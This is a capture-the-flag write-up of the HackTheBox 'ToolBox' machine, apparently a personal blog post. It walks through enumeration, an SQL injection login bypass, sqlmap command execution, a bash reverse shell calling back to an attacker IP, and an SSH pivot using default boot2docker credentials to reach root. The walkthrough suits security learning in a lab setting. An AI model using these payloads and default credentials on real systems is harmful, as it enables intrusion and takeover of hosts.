---
title: "HackTheBox - ToolBox"
author: Nasrallah
description: ""
date: 2023-04-17 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, docker, sqli]
img_path: /assets/img/hackthebox/machines/toolbox
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Toolbox](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.236                                                                                                                             
Host is up (0.30s latency).                                                                                                                                   
Not shown: 994 closed tcp ports (reset)                                                                                                                       
PORT    STATE SERVICE       VERSION                                                                                                                           
21/tcp  open  ftp           FileZilla ftpd                                                                                                                    
| ftp-syst:                                                                                                                                                   
|_  SYST: UNIX emulated by FileZilla                                                                                                                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp  open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b1aa18199eaf79602192e6e97045a3f (RSA)
|   256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA)
|_  256 ea08966023e2f44f8d05b31841352339 (ED25519)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaLogistics
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56 
|_Not valid after:  2021-02-17T17:45:56 
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-04-09T10:46:21
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

We have FTP with anonymous login allowed, ssh on port 22, SMB on port (135,139,445) and Apache https web server and it says it's `Debian`, this means it's running on a docker container.

## FTP

Let's login and see what's there.

```terminal
 $ ftp 10.10.10.236                                                                                                                                 130 ⨯ 
Connected to 10.10.10.236.                                                                                                                                    
220-FileZilla Server 0.9.60 beta                                                                                                                              
220-written by Tim Kosse (tim.kosse@filezilla-project.org)                                                                                                    
220 Please visit https://filezilla-project.org/                                                                                                               
Name (10.10.10.236:sirius): anonymous                                                                                                                         
331 Password required for anonymous                                                                                                                           
Password:                                                                                                                                                     
230 Logged on                                                                                                                                                 
Remote system type is UNIX.                                                                                                                                   
ftp> ls                                                                                                                                                       
200 Port command successful                                                                                                                                   
150 Opening data channel for directory listing of "/"                                                                                                         
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe                                                                                           
226 Successfully transferred "/"                                                                                                                              
ftp> exit                                                                                                                                                     
221 Goodbye                            
```

We found one file which is `docker-toolbox.exe`.

Docker-Toolbox allows to deploy containers in windows before windows has support for Docker.

Let's move on.

## SMB

Let's list available shares.

```terminal
$ smbclient -L 10.10.10.236 -N                                                                                                                           
session setup failed: NT_STATUS_ACCESS_DENIED           
```

Couldn't do that, we get access denied.

## Web

Before going to the web page, nmap scripts had showed us the domain `admin.megalogistic.com`, so let's add that to /etc/hosts along with `megalogistic.com`.

![](1.png)

Nothing interesting is this page, and everything is static pages.

Let's go the admin subdomain.

![](2.png)

We got a login page, i tried some default credentials and failed, but managed to login via sql injection with the payload `' or 1=1 --`.

![](3.png)

Since the page is vulnerable to sqli, let's throw is to `sqlmap` and see what we can get back.

```bash
sqlmap -u 'https://admin.megalogistic.com/' --forms --batch --dump
```

![](4.png)

Managed to retrieve the admin hash, but couldn't crack it.

# **Foothold**

Let's use `--os-shell` option is `sqlmap` to get a shell and execute commands on the target.

![](5.png)

With that i put this reverse shell `sh -i >& /dev/tcp/10.10.17.90/9001 0>&1` in a file and executed the file to get a reverse shell.

![](6.png)


# **Privilege Escalation**

Running `ifconfig` shows our ip `172.17.0.2`

```terminal
www-data@bc56e3cc55e9:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 844587  bytes 100413105 (95.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 553291  bytes 572398666 (545.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Running `uname -a` we get the following result

```terminal
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux
```

The first thing we notice is the hostname which indicate we're in a docker container and the linux distribution is called `boot2docker`

Searching for `boot2docker exploit` i found this [article](https://rioasmara.com/2021/08/08/privilege-escalation-boot2docker/) that shows default credentials for the host of this container.

Let's use the credentials `docker:tcuser` to ssh to the host at `172.17.0.1`

```terminal
postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1                                                                                                                
docker@172.17.0.1's password:                                                                                                                                                                                                                                                            
   ( '>')                                                                                                                                                     
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.                                                                                                 
 (/-_--_-\)           www.tinycorelinux.net                                                                                                                   
                                                                                                                                                              
docker@box:~$ whoami                                                                                                                                          
docker                                                                                                                                                        
docker@box:~$ id                                                                
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)

```

If we check our privileges we see that we can run anything as root.

```terminal
docker@box:~$ sudo -l                                                           
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
```

Let's get a root shell with `sudo su`.

The root directory is empty so i searched for the root flag and found it's place.

```terminal
root@box:~# find / -type f -name root.txt 2>/dev/null                           
/c/Users/Administrator/Desktop/root.txt 
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).